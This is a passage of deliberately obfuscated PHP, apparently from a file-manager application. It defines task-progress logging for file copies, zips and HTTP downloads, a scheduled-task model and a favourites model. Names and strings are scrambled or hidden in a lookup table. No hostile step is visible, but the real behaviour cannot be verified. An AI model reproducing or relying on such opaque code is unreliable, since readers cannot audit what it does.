$ªı‚×Ú[1826])); Hook::unbind($ªı‚×Ú[1827], array($this, $ªı‚×Ú[1828])); } public function copyMoveStart($˜şğ¯«, $éÇÑ­í, $ôïñ­ï¾, $… ÏûŸ) { $üÈ¡øê‡ =& $_SERVER[ÔÕ±ĞšÎ]; self::log($üÈ¡øê‡[1838] . $éÇÑ­í . $üÈ¡øê‡[73] . $… ÏûŸ); $‹Êğå”È = rtrim(TEMP_FILES, $üÈ¡øê‡[8]); if (substr($éÇÑ­í, 0, strlen($‹Êğå”È)) == $‹Êğå”È) { return; } if (substr($… ÏûŸ, 0, strlen($‹Êğå”È)) == $‹Êğå”È) { return; } $é­üŠİá =& $this->task; $é­üŠİá[$üÈ¡øê‡[1839]] = KodIO::transferType($˜şğ¯«, $ôïñ­ï¾); $this->update(); } public function updateAfter() { $à§‰ÃÜ =& $_SERVER[ÔÕ±ĞšÎ]; $¤ğ¯™‹ì =& $this->task; if (!$¤ğ¯™‹ì[$à§‰ÃÜ[837]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¤ğ¯™‹ì[$à§‰ÃÜ[1839]] == $à§‰ÃÜ[1404]) { return; } self::updateTask($¤ğ¯™‹ì); } private static function updateTask(&$Ú˜òÄ´”) { $¶Õú‡‚Ï =& $_SERVER[ÔÕ±ĞšÎ]; if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1839]] == $¶Õú‡‚Ï[1281] || $Ú˜òÄ´”[$¶Õú‡‚Ï[1839]] == $¶Õú‡‚Ï[110]) { if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1833]]) { $Ú˜òÄ´”[$¶Õú‡‚Ï[1836]] = $Ú˜òÄ´”[$¶Õú‡‚Ï[1835]] + $Ú˜òÄ´”[$¶Õú‡‚Ï[1832]]; } } else { if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1839]] == $¶Õú‡‚Ï[1405]) { if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1833]] == $¶Õú‡‚Ï[1281]) { $Ú˜òÄ´”[$¶Õú‡‚Ï[1836]] = $Ú˜òÄ´”[$¶Õú‡‚Ï[1835]] + $Ú˜òÄ´”[$¶Õú‡‚Ï[1832]] * 0.5; } else { if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1833]] == $¶Õú‡‚Ï[110]) { $Ú˜òÄ´”[$¶Õú‡‚Ï[1836]] = $Ú˜òÄ´”[$¶Õú‡‚Ï[1835]] + $Ú˜òÄ´”[$¶Õú‡‚Ï[1831]] * 0.5 + $Ú˜òÄ´”[$¶Õú‡‚Ï[1832]] * 0.5; } } } } $Ú˜òÄ´”[$¶Õú‡‚Ï[1779]] = $Ú˜òÄ´”[$¶Õú‡‚Ï[1836]] / $Ú˜òÄ´”[$¶Õú‡‚Ï[837]]; if ($Ú˜òÄ´”[$¶Õú‡‚Ï[1779]] > 0) { $ôÖ’»²º = timeFloat() - $Ú˜òÄ´”[$¶Õú‡‚Ï[1781]] - $Ú˜òÄ´”[$¶Õú‡‚Ï[1784]]; $Ú˜òÄ´”[$¶Õú‡‚Ï[1785]] = $ôÖ’»²º * (1 - $Ú˜òÄ´”[$¶Õú‡‚Ï[1779]]) / $Ú˜òÄ´”[$¶Õú‡‚Ï[1779]]; } } public function addPath($ó³™ºß) { $©Ä¯øıÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ó³™ºß) { return; } $…Õü³Ôº =& $this->task; $¾¿¹™ ¨ = IO::infoWithChildren($ó³™ºß); $÷¹õ«¨ = $…Õü³Ôº[$©Ä¯øıÏ[1840]] ? $…Õü³Ôº[$©Ä¯øıÏ[1840]][$©Ä¯øıÏ[1841]] : 0; $…Õü³Ôº[$©Ä¯øıÏ[1840]] = array($©Ä¯øıÏ[1841] => $÷¹õ«¨ + 1, $©Ä¯øıÏ[496] => $¾¿¹™ ¨[$©Ä¯øıÏ[32]], $©Ä¯øıÏ[87] => $¾¿¹™ ¨[$©Ä¯øıÏ[87]], $©Ä¯øıÏ[584] => $¾¿¹™ ¨[$©Ä¯øıÏ[584]] ? $¾¿¹™ ¨[$©Ä¯øıÏ[584]] : $¾¿¹™ ¨[$©Ä¯øıÏ[87]]); if ($¾¿¹™ ¨[$©Ä¯øıÏ[33]] == $©Ä¯øıÏ[232]) { $…Õü³Ôº[$©Ä¯øıÏ[1142]] += 1; } else { $…Õü³Ôº[$©Ä¯øıÏ[1142]] += $¾¿¹™ ¨[$©Ä¯øıÏ[82]][$©Ä¯øıÏ[80]]; if ($¾¿¹™ ¨[$©Ä¯øıÏ[193]]) { $…Õü³Ôº[$©Ä¯øıÏ[1142]] += $¾¿¹™ ¨[$©Ä¯øıÏ[82]][$©Ä¯øıÏ[81]] + 1; } } $…Õü³Ôº[$©Ä¯øıÏ[837]] += $¾¿¹™ ¨[$©Ä¯øıÏ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¬ş·ë¤) { } public function sourceAddHashEnd($—´ß±–ƒ) { } public function sourceAddFileStart($ÚâöØ­¢) { $Ï¢†Ò¸Ú =& $_SERVER[ÔÕ±ĞšÎ]; $ëÜÛÊÑ =& $this->task; $ëÜÛÊÑ[$Ï¢†Ò¸Ú[1831]] = $ÚâöØ­¢[$Ï¢†Ò¸Ú[79]]; $ëÜÛÊÑ[$Ï¢†Ò¸Ú[1829]] = $ÚâöØ­¢[$Ï¢†Ò¸Ú[32]]; $ëÜÛÊÑ[$Ï¢†Ò¸Ú[1144]] = $ÚâöØ­¢[$Ï¢†Ò¸Ú[32]]; $ëÜÛÊÑ[$Ï¢†Ò¸Ú[1842]] = $ÚâöØ­¢[$Ï¢†Ò¸Ú[87]]; $this->update(); } public function sourceAddFileEnd($µ˜­ì¹‡) { $êÒÔÅò =& $_SERVER[ÔÕ±ĞšÎ]; $ñŞñÕÈ =& $this->task; $ñŞñÕÈ[$êÒÔÅò[1836]] += $µ˜­ì¹‡[$êÒÔÅò[79]]; $ñŞñÕÈ[$êÒÔÅò[1842]] = $µ˜­ì¹‡[$êÒÔÅò[87]]; $this->update(1); } public function copyFileStart($ãşôÔÇÌ, $ßêèƒ…ù, $‡Ø ı‡¢, $ˆÉ¿Í¸, $µï©Œ³ò, $­¬‰‰ÏÊ) { $Ó‰œÇ‰¨ =& $_SERVER[ÔÕ±ĞšÎ]; $Ò¶²¡Öá = $µï©Œ³ò; if ($Ò¶²¡Öá == $GLOBALS[$Ó‰œÇ‰¨[1843]]) { $Ò¶²¡Öá = $GLOBALS[$Ó‰œÇ‰¨[1844]]; } $GLOBALS[$Ó‰œÇ‰¨[1844]] = $µï©Œ³ò; $GLOBALS[$Ó‰œÇ‰¨[1843]] = $­¬‰‰ÏÊ; $äÖµ¶Ä¯ =& $this->task; $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1829]] = $Ò¶²¡Öá; $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1831]] = (int) $ãşôÔÇÌ->size($ßêèƒ…ù); $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1832]] = 0; $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1144]] = $Ó‰œÇ‰¨[12]; $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1833]] = $Ó‰œÇ‰¨[12]; $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1834]] = 0; $Ûœà€œ× = $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1831]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($äÖµ¶Ä¯[$Ó‰œÇ‰¨[477]] . $Ó‰œÇ‰¨[1845]); if ($Ûœà€œ× && file_exists(get_path_father($ˆÉ¿Í¸))) { Cache::set($äÖµ¶Ä¯[$Ó‰œÇ‰¨[477]] . $Ó‰œÇ‰¨[1845], $ˆÉ¿Í¸); $äÖµ¶Ä¯[$Ó‰œÇ‰¨[1802]] = array($Ó‰œÇ‰¨[1846], $Ó‰œÇ‰¨[1847]); } $this->update(0, $Ûœà€œ×); } public static function updateCopyLocalFileSize($î«±‰ıı) { $Ô± ÖÉ =& $_SERVER[ÔÕ±ĞšÎ]; $ÔŠùºş› = Cache::get($î«±‰ıı[$Ô± ÖÉ[477]] . $Ô± ÖÉ[1845]); if (!$ÔŠùºş› || !file_exists($ÔŠùºş›)) { return $î«±‰ıı; } $î«±‰ıı[$Ô± ÖÉ[1832]] = @filesize($ÔŠùºş›); $î«±‰ıı[$Ô± ÖÉ[1836]] += $î«±‰ıı[$Ô± ÖÉ[1832]]; self::updateTask($î«±‰ıı); return $î«±‰ıı; } public function copyFileEnd($š¿´İ†Š, $ŒîíĞ€, $Ê£ö÷ìµ, $ŸØ˜ ×, $´ÁÒÆÌ, $ò¶ÇÓ) { $ÃñôÙƒ =& $_SERVER[ÔÕ±ĞšÎ]; $¯Ë˜Ç =& $this->task; $¯Ë˜Ç[$ÃñôÙƒ[1832]] = $¯Ë˜Ç[$ÃñôÙƒ[1831]]; $¯Ë˜Ç[$ÃñôÙƒ[1833]] = $ÃñôÙƒ[12]; unset($¯Ë˜Ç[$ÃñôÙƒ[1802]]); if ($´ÁÒÆÌ == $¯Ë˜Ç[$ÃñôÙƒ[1829]]) { $¯Ë˜Ç[$ÃñôÙƒ[1835]] += $¯Ë˜Ç[$ÃñôÙƒ[1831]]; $¯Ë˜Ç[$ÃñôÙƒ[1836]] = $¯Ë˜Ç[$ÃñôÙƒ[1835]]; $—şÓ£Û™ = 1; if (isset($¯Ë˜Ç[$ÃñôÙƒ[1842]]) && $¯Ë˜Ç[$ÃñôÙƒ[1842]] == $ŒîíĞ€) { $—şÓ£Û™ = 0; } $this->update($—şÓ£Û™); } else { $this->update(); $¯Ë˜Ç[$ÃñôÙƒ[1832]] = 0; } Cache::remove($¯Ë˜Ç[$ÃñôÙƒ[477]] . $ÃñôÙƒ[1845]); self::log($ÃñôÙƒ[1848] . $ŒîíĞ€ . $ÃñôÙƒ[73] . $ŸØ˜ × . $ÃñôÙƒ[287] . $´ÁÒÆÌ . $ÃñôÙƒ[1849] . $¯Ë˜Ç[$ÃñôÙƒ[1829]]); } public function updateFileEnd($ÃÉÃ½ºÌ, $°§™ùì) { $ğ§Ò¡ =& $_SERVER[ÔÕ±ĞšÎ]; $Áşîìš´ =& $this->task; $Áşîìš´[$ğ§Ò¡[1829]] = $ÃÉÃ½ºÌ; $Áşîìš´[$ğ§Ò¡[1831]] = $°§™ùì; $Áşîìš´[$ğ§Ò¡[1835]] += $°§™ùì; $Áşîìš´[$ğ§Ò¡[1836]] = $Áşîìš´[$ğ§Ò¡[1835]]; $this->update(1); self::log($ğ§Ò¡[1850] . $ÃÉÃ½ºÌ); } public function sourceModelCopy($°ğæóÇµ) { $€æ¼©• =& $_SERVER[ÔÕ±ĞšÎ]; $ÉÓçéŒÜ = $°ğæóÇµ[0]; $ÅñôüÓş = $°ğæóÇµ[1]; $ñ¸ÚÀĞõ =& $this->task; $this->sourceModelCopyFlag = !0; $¸‡şĞ¢é = 0; switch ($ÉÓçéŒÜ) { case $€æ¼©•[640]: $¸‡şĞ¢é = 1; break; case $€æ¼©•[643]: $ñ¸ÚÀĞõ[$€æ¼©•[1829]] = $ÅñôüÓş[$€æ¼©•[32]]; break; case $€æ¼©•[645]: $¸‡şĞ¢é = intval($°ğæóÇµ[$€æ¼©•[458]] * 0.4); break; case $€æ¼©•[647]: $¸‡şĞ¢é = intval($°ğæóÇµ[$€æ¼©•[458]] * 0.2); break; case $€æ¼©•[649]: $¸‡şĞ¢é = intval($°ğæóÇµ[$€æ¼©•[458]] * 0.4); break; } $this->update($¸‡şĞ¢é); $this->sourceModelCopyFlag = !1; } public function sourceRemove($»êÂÈ£†, $ƒ¥Ïå‘ö) { $éŞŠÈÇß =& $_SERVER[ÔÕ±ĞšÎ]; $this->sourceModelCopyFlag = !0; $ÕàìıÖú = 1; if (isset($»êÂÈ£†[$éŞŠÈÇß[82]])) { $ÕàìıÖú = $»êÂÈ£†[$éŞŠÈÇß[82]][$éŞŠÈÇß[80]]; $ÕàìıÖú = $ÕàìıÖú + $»êÂÈ£†[$éŞŠÈÇß[82]][$éŞŠÈÇß[81]] + 1; } $this->update($ÕàìıÖú); $this->sourceModelCopyFlag = !1; } public function sourceMove($Í–¬µ¨®) { $this->sourceRemove($Í–¬µ¨®, !1); } public function curlProgress($Îİ§”áú, $‹ü ’µ, $Ï²•Å¹, $€ÀÂ¶—ƒ, $£Ö§­òö) { $­ˆ­Íìé =& $_SERVER[ÔÕ±ĞšÎ]; $‘òí÷ƒ =& $this->task; if ($£Ö§­òö > 0) { $‘òí÷ƒ[$­ˆ­Íìé[1144]] = $­ˆ­Íìé[1851]; $‘òí÷ƒ[$­ˆ­Íìé[1833]] = $­ˆ­Íìé[110]; if ($‘òí÷ƒ[$­ˆ­Íìé[1831]]) { $‘òí÷ƒ[$­ˆ­Íìé[1832]] = $£Ö§­òö; } if ($‘òí÷ƒ[$­ˆ­Íìé[1834]]) { $‘òí÷ƒ[$­ˆ­Íìé[1832]] = $£Ö§­òö + $‘òí÷ƒ[$­ˆ­Íìé[1834]]; } } else { if ($Ï²•Å¹ > 0) { if ($‘òí÷ƒ[$­ˆ­Íìé[1831]] == $‹ü ’µ) { $‘òí÷ƒ[$­ˆ­Íìé[1832]] = $Ï²•Å¹; $‘òí÷ƒ[$­ˆ­Íìé[1144]] = $­ˆ­Íìé[1852]; $‘òí÷ƒ[$­ˆ­Íìé[1833]] = $­ˆ­Íìé[1281]; } } } $this->update(); } public function curlProgressStart($æ×¤ØŒ¾) { } public function curlProgressEnd($´™¥Ä§) { $ôìŒÙÎ’ =& $_SERVER[ÔÕ±ĞšÎ]; $­ÊîÃ¹Ú =& $this->task; $€æø˜Œ = curl_getinfo($´™¥Ä§); $¤Â‘Á…ö = $€æø˜Œ[$ôìŒÙÎ’[1853]]; if ($¤Â‘Á…ö == -1) { $¤Â‘Á…ö = $€æø˜Œ[$ôìŒÙÎ’[1854]]; } if ($­ÊîÃ¹Ú[$ôìŒÙÎ’[1833]] == $ôìŒÙÎ’[110] && $¤Â‘Á…ö) { $­ÊîÃ¹Ú[$ôìŒÙÎ’[1834]] += $¤Â‘Á…ö; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Êİô°–· =& $_SERVER[ÔÕ±ĞšÎ]; $¡‰‚²™é =& $this->task; $¡‰‚²™é[$Êİô°–·[1855]] = 1; Hook::bind($Êİô°–·[1823], array($this, $Êİô°–·[1856])); Hook::bind($Êİô°–·[1825], array($this, $Êİô°–·[1857])); Hook::bind($Êİô°–·[1827], array($this, $Êİô°–·[1858])); } protected function endAfter() { $ã˜ÆÆ«Š =& $_SERVER[ÔÕ±ĞšÎ]; Hook::unbind($ã˜ÆÆ«Š[1823], array($this, $ã˜ÆÆ«Š[1856])); Hook::unbind($ã˜ÆÆ«Š[1825], array($this, $ã˜ÆÆ«Š[1857])); Hook::unbind($ã˜ÆÆ«Š[1827], array($this, $ã˜ÆÆ«Š[1858])); } public function progressStart($ˆÆ‚©) { $¹Õù‚ =& $_SERVER[ÔÕ±ĞšÎ]; $Ó³§÷… = curl_getinfo($ˆÆ‚©); self::log($¹Õù‚[1859] . $Ó³§÷…[$¹Õù‚[384]]); self::valueSet($this->task[$¹Õù‚[477]], $this->task); } public function progressEnd($ø©Ö¸¹Š) { $ö· ıš˜ =& $_SERVER[ÔÕ±ĞšÎ]; self::log($ö· ıš˜[1860] . $this->task[$ö· ıš˜[477]]); $this->end(); } public function progress($ğò³ÓÒó, $­¸ŒßÕ , $«¬²—Ñœ, $Ñ¸‘¨ã¡, $æş»Ì÷) { $ãÂËÔ¹Ù =& $_SERVER[ÔÕ±ĞšÎ]; $İè§œÖÂ =& $this->task; if ($æş»Ì÷ > 0) { $İè§œÖÂ[$ãÂËÔ¹Ù[1142]] = $İè§œÖÂ[$ãÂËÔ¹Ù[1142]] == 0 ? $Ñ¸‘¨ã¡ : $İè§œÖÂ[$ãÂËÔ¹Ù[1142]]; $İè§œÖÂ[$ãÂËÔ¹Ù[1778]] = $æş»Ì÷; } else { if ($«¬²—Ñœ > 0) { $İè§œÖÂ[$ãÂËÔ¹Ù[1142]] = $İè§œÖÂ[$ãÂËÔ¹Ù[1142]] == 0 ? $­¸ŒßÕ  : $İè§œÖÂ[$ãÂËÔ¹Ù[1142]]; $İè§œÖÂ[$ãÂËÔ¹Ù[1778]] = $«¬²—Ñœ; } } $this->update(); self::log("\x70\x72\x6f\x67\162\x65\x73\x73\x48\x74\164\160\72\x64\x6f\x77\156\x3a{$«¬²—Ñœ}\57{$­¸ŒßÕ }\73\40\165\x70\x6c\157\141\x64\72{$æş»Ì÷}\x2f{$Ñ¸‘¨ã¡}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($­¥ç÷ã«, $Ö€¼ñ‰ = '', $Ìëı§Ü = 0, $™€Å¸Áä = '') { $Ğò•õÔË =& $_SERVER[ÔÕ±ĞšÎ]; $™€Å¸Áä = $™€Å¸Áä ? $™€Å¸Áä : ($Ö€¼ñ‰ ? $Ö€¼ñ‰ : $­¥ç÷ã«); $¢± Ø¤Ä = new Task($­¥ç÷ã«, $Ö€¼ñ‰, $Ìëı§Ü, $™€Å¸Áä); $GLOBALS[$Ğò•õÔË[1861] . $­¥ç÷ã«] = new TaskLog($Ğò•õÔË[1760], $¢± Ø¤Ä, $™€Å¸Áä); return $¢± Ø¤Ä; } public function __construct($¦Í·–Í’ = '', $úÖ€úÂ› = '', $‡Ñï¯±ğ = '') { $ÌÎ‹ß =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¦Í·–Í’) { $¦Í·–Í’ = $ÌÎ‹ß[1760]; } $•Ç€¢¨ = $¦Í·–Í’ . $ÌÎ‹ß[464] . rand_string(10); if (!$‡Ñï¯±ğ) { $‡Ñï¯±ğ = $¦Í·–Í’ . $ÌÎ‹ß[53] . $‡Ñï¯±ğ; } switch ($¦Í·–Í’) { case $ÌÎ‹ß[1760]: if (!$úÖ€úÂ› || !$úÖ€úÂ›->task) { return echoLog($¦Í·–Í’ . $ÌÎ‹ß[1862]); } $ëÒ™Ó£ö = $úÖ€úÂ›; $•Ç€¢¨ = $ëÒ™Ó£ö->task[$ÌÎ‹ß[477]]; $¦Í·–Í’ = $ëÒ™Ó£ö->task[$ÌÎ‹ß[477]]; if (!$ëÒ™Ó£ö->task[$ÌÎ‹ß[1665]]) { $ëÒ™Ó£ö->task[$ÌÎ‹ß[1665]] = $‡Ñï¯±ğ ? $‡Ñï¯±ğ : $¦Í·–Í’; } break; case $ÌÎ‹ß[1863]: if (!$úÖ€úÂ›) { return echoLog($¦Í·–Í’ . $ÌÎ‹ß[1864]); } $ºÚ¿äã´ = is_string($úÖ€úÂ›) ? array($úÖ€úÂ›) : $úÖ€úÂ›; $ëÒ™Ó£ö = new TaskFileTransfer($•Ç€¢¨, $¦Í·–Í’, 0, $‡Ñï¯±ğ ? $‡Ñï¯±ğ : $ºÚ¿äã´[0]); foreach ($ºÚ¿äã´ as $ıø‡‚¾ï) { $ëÒ™Ó£ö->addPath($ıø‡‚¾ï); } break; case $ÌÎ‹ß[390]: if (!$úÖ€úÂ›) { return echoLog($¦Í·–Í’ . $ÌÎ‹ß[1864]); } $ºÚ¿äã´ = is_string($úÖ€úÂ›) ? array($úÖ€úÂ›) : $úÖ€úÂ›; $ëÒ™Ó£ö = new TaskZip($•Ç€¢¨, $¦Í·–Í’, 0, $‡Ñï¯±ğ ? $‡Ñï¯±ğ : $ºÚ¿äã´[0]); foreach ($ºÚ¿äã´ as $ıø‡‚¾ï) { $ëÒ™Ó£ö->addPath($ıø‡‚¾ï); } break; case $ÌÎ‹ß[1301]: if (!$úÖ€úÂ›) { return echoLog($¦Í·–Í’ . $ÌÎ‹ß[1864]); } $ëÒ™Ó£ö = new TaskUnZip($•Ç€¢¨, $¦Í·–Í’, 0, $‡Ñï¯±ğ ? $‡Ñï¯±ğ : $úÖ€úÂ›); if ($úÖ€úÂ›) { $ëÒ™Ó£ö->addFile($úÖ€úÂ›); } break; case $ÌÎ‹ß[152]: $ëÒ™Ó£ö = new TaskHttp($•Ç€¢¨, $¦Í·–Í’); break; default: return; break; } $this->task = $ëÒ™Ó£ö; $this->taskID = $•Ç€¢¨; Hook::bind($ÌÎ‹ß[1798], array($this, $ÌÎ‹ß[1865])); Hook::bind($ÌÎ‹ß[1800], array($this, $ÌÎ‹ß[1866])); Hook::bind($ÌÎ‹ß[1794], array($this, $ÌÎ‹ß[1867])); echoLog($ÌÎ‹ß[1868] . $ëÒ™Ó£ö->task[$ÌÎ‹ß[1665]]); } public function __destruct() { $this->end(); } public function end($îàÊëñİ = '') { $ƒ»ıâÒ¥ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($îàÊëñİ); $this->task = !1; $this->taskID = !1; Hook::unbind($ƒ»ıâÒ¥[1798], array($this, $ƒ»ıâÒ¥[1865])); Hook::unbind($ƒ»ıâÒ¥[1800], array($this, $ƒ»ıâÒ¥[1866])); Hook::unbind($ƒ»ıâÒ¥[1794], array($this, $ƒ»ıâÒ¥[1867])); } public function taskUpdate($İ‰ôçü½) { $Êà¾¶Ù¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$İ‰ôçü½ || $this->taskID != $İ‰ôçü½[$Êà¾¶Ù¨[477]]) { return; } $ò¡´¼¦Œ = 20; $‰²¢µÎ¤ = intval($İ‰ôçü½[$Êà¾¶Ù¨[1779]] * $ò¡´¼¦Œ); $ŒíàÁ¯“ = $Êà¾¶Ù¨[176] . str_repeat($Êà¾¶Ù¨[508], $‰²¢µÎ¤) . $Êà¾¶Ù¨[1093] . str_repeat($Êà¾¶Ù¨[53], $ò¡´¼¦Œ - $‰²¢µÎ¤) . $Êà¾¶Ù¨[178]; $´ãÒŒ¡ = $ŒíàÁ¯“ . sprintf($Êà¾¶Ù¨[1869], $İ‰ôçü½[$Êà¾¶Ù¨[1779]] * 100) . $Êà¾¶Ù¨[1870]; $ñ†Ø¨Øí = $´ãÒŒ¡ . $İ‰ôçü½[$Êà¾¶Ù¨[1778]] . $Êà¾¶Ù¨[8] . $İ‰ôçü½[$Êà¾¶Ù¨[1142]] . LNG($Êà¾¶Ù¨[1871]); $›ù±ôÃŠ = $Êà¾¶Ù¨[12]; if ($İ‰ôçü½[$Êà¾¶Ù¨[1855]]) { $ñ†Ø¨Øí = $´ãÒŒ¡ . size_format($İ‰ôçü½[$Êà¾¶Ù¨[1778]]) . $Êà¾¶Ù¨[8] . size_format($İ‰ôçü½[$Êà¾¶Ù¨[1142]]); $›ù±ôÃŠ = size_format($İ‰ôçü½[$Êà¾¶Ù¨[1780]]) . $Êà¾¶Ù¨[1872]; } if ($İ‰ôçü½[$Êà¾¶Ù¨[1144]]) { $İ‰ôçü½[$Êà¾¶Ù¨[1829]] = $İ‰ôçü½[$Êà¾¶Ù¨[1144]] . $Êà¾¶Ù¨[53] . $İ‰ôçü½[$Êà¾¶Ù¨[1829]]; } if ($İ‰ôçü½[$Êà¾¶Ù¨[1829]]) { $ıİº¬œ = $Êà¾¶Ù¨[12]; if ($İ‰ôçü½[$Êà¾¶Ù¨[1831]]) { $ıİº¬œ = $Êà¾¶Ù¨[50] . size_format($İ‰ôçü½[$Êà¾¶Ù¨[1832]]) . $Êà¾¶Ù¨[8] . size_format($İ‰ôçü½[$Êà¾¶Ù¨[1831]]); } $›ù±ôÃŠ .= $İ‰ôçü½[$Êà¾¶Ù¨[1829]] . $ıİº¬œ; } if ($İ‰ôçü½[$Êà¾¶Ù¨[837]] && !$İ‰ôçü½[$Êà¾¶Ù¨[1831]]) { $›ù±ôÃŠ .= $Êà¾¶Ù¨[53] . size_format($İ‰ôçü½[$Êà¾¶Ù¨[1836]]) . $Êà¾¶Ù¨[8] . size_format($İ‰ôçü½[$Êà¾¶Ù¨[837]]); } echoLog($ñ†Ø¨Øí . $Êà¾¶Ù¨[53] . $›ù±ôÃŠ, !0); } public function taskEnd($õ¦ ”ë) { $¢ÍŠŠÇÊ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$õ¦ ”ë || $this->taskID != $õ¦ ”ë[$¢ÍŠŠÇÊ[477]]) { return; } $ïäÕäô½ = $õ¦ ”ë ? LNG($¢ÍŠŠÇÊ[1873]) . $¢ÍŠŠÇÊ[4] . $õ¦ ”ë[$¢ÍŠŠÇÊ[1778]] . $¢ÍŠŠÇÊ[8] . $õ¦ ”ë[$¢ÍŠŠÇÊ[1142]] . LNG($¢ÍŠŠÇÊ[1871]) . $¢ÍŠŠÇÊ[74] : $¢ÍŠŠÇÊ[12]; echoLog($¢ÍŠŠÇÊ[1874] . $õ¦ ”ë[$¢ÍŠŠÇÊ[1665]] . ($õ¦ ”ë[$¢ÍŠŠÇÊ[528]] ? $¢ÍŠŠÇÊ[74] . $õ¦ ”ë[$¢ÍŠŠÇÊ[528]] : $¢ÍŠŠÇÊ[12]) . $¢ÍŠŠÇÊ[74] . $ïäÕäô½ . $¢ÍŠŠÇÊ[1875] . sprintf($¢ÍŠŠÇÊ[926], timeFloat() - $õ¦ ”ë[$¢ÍŠŠÇÊ[1781]]) . $¢ÍŠŠÇÊ[1793]); $this->end(); } public function taskKill($÷Œîá–”) { $’ùŒÉÑ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$÷Œîá–” || $this->taskID != $÷Œîá–”[$’ùŒÉÑ[477]]) { return; } echoLog($’ùŒÉÑ[1876] . $÷Œîá–”[$’ùŒÉÑ[1665]]); } } goto A«§ÖÚß; C“åÊæí® : class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\164\x61\163\153\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x74\x79\160\145", "\x65\166\145\156\164", "\x74\x69\x6d\145", "\144\x65\163\x63", "\x73\171\x73\164\x65\155", "\x65\x6e\x61\142\x6c\145", "\x6c\141\163\x74\122\165\156", "\163\157\162\164"); public function listData($¿Ñ¿ò©„ = false, $ÍúÃ•ş = "\x73\157\162\164", $¤•¯ÉÈŒ = false) { return parent::listData($¿Ñ¿ò©„, $ÍúÃ•ş, $¤•¯ÉÈŒ); } public function add($›ì­šÓ€) { $Õù¬÷ê³ =& $_SERVER[ÔÕ±ĞšÎ]; $§ÖÂÙ¶ = $this->findByName($›ì­šÓ€[$Õù¬÷ê³[32]]); if ($§ÖÂÙ¶) { return !1; } $›ì­šÓ€[$Õù¬÷ê³[1727]] = 0; $›ì­šÓ€[$Õù¬÷ê³[2002]] = $this->getSort(); return parent::insert($›ì­šÓ€); } private function getSort() { $’íÏÚÛ =& $_SERVER[ÔÕ±ĞšÎ]; $íÜªşÃË = parent::listData(); $î¹êšê‹ = array_to_keyvalue($íÜªşÃË, $’íÏÚÛ[12], $’íÏÚÛ[2002]); return empty($î¹êšê‹) ? 0 : max($î¹êšê‹) + 1; } public function update($üŒÁ«ã•, $òáò¢¼–) { $ˆ±Ñ§®Á =& $_SERVER[ÔÕ±ĞšÎ]; $ÍÚ€Ş = $this->listData($üŒÁ«ã•); $èãÜÑ± = $this->findByName($òáò¢¼–[$ˆ±Ñ§®Á[32]]); if (!$ÍÚ€Ş || $èãÜÑ± && $èãÜÑ±[$ˆ±Ñ§®Á[477]] != $ÍÚ€Ş[$ˆ±Ñ§®Á[477]]) { return !1; } return parent::update($üŒÁ«ã•, $òáò¢¼–); } public function remove($õšòÖÆò, $¹¸¼¿ç = false) { $Ïõ€š†Ì =& $_SERVER[ÔÕ±ĞšÎ]; $ı¡ã¥‰Œ = $this->listData($õšòÖÆò); if (!$ı¡ã¥‰Œ) { return; } if (!$¹¸¼¿ç && $ı¡ã¥‰Œ[$Ïõ€š†Ì[191]] == $Ïõ€š†Ì[91]) { return !1; } return parent::remove($õšòÖÆò); } public function enable($ïû„¯»œ, $ˆš¤—À) { return $this->update($ïû„¯»œ, array($_SERVER[ÔÕ±ĞšÎ][2451] => $ˆš¤—À)); } public function run($½½¨Ä•) { return $this->update($½½¨Ä•, array($_SERVER[ÔÕ±ĞšÎ][2463] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ªªâ‹Ÿ­) { $”‘¨”Õ¦ =& $_SERVER[ÔÕ±ĞšÎ]; return array($”‘¨”Õ¦[2094] => array(USER_ID, $”‘¨”Õ¦[2464])); } protected function listData() { $¿Ì„ä·“ =& $_SERVER[ÔÕ±ĞšÎ]; $«¯©´×Á = array($¿Ì„ä·“[1768] => USER_ID, $¿Ì„ä·“[559] => 0); $´ßĞõË¶ = $¿Ì„ä·“[2465]; $ìÛıØÍ© = $this->field($´ßĞõË¶)->where($«¯©´×Á)->order($¿Ì„ä·“[2466])->select(); return $ìÛıØÍ© ? $ìÛıØÍ© : array(); } protected function resetCache() { } protected function listView() { $œ‹Ì—Àğ =& $_SERVER[ÔÕ±ĞšÎ]; $€ş„ÏÑå = $this->listData(); $…â£ë‚ = array_filter_by_field($€ş„ÏÑå, $œ‹Ì—Àğ[33], $œ‹Ì—Àğ[492]); $ˆçš¼› = array_to_keyvalue($…â£ë‚, $œ‹Ì—Àğ[12], $œ‹Ì—Àğ[87]); if (!$ˆçš¼›) { return $€ş„ÏÑå; } $äĞâè = 2000; $’Í¦¶À‚ = array($œ‹Ì—Àğ[493] => array($œ‹Ì—Àğ[494], $ˆçš¼›)); $Ç¶ÃÜÛÆ = Model($œ‹Ì—Àğ[899])->listSource($’Í¦¶À‚, $äĞâè); $Ç¶ÃÜÛÆ = 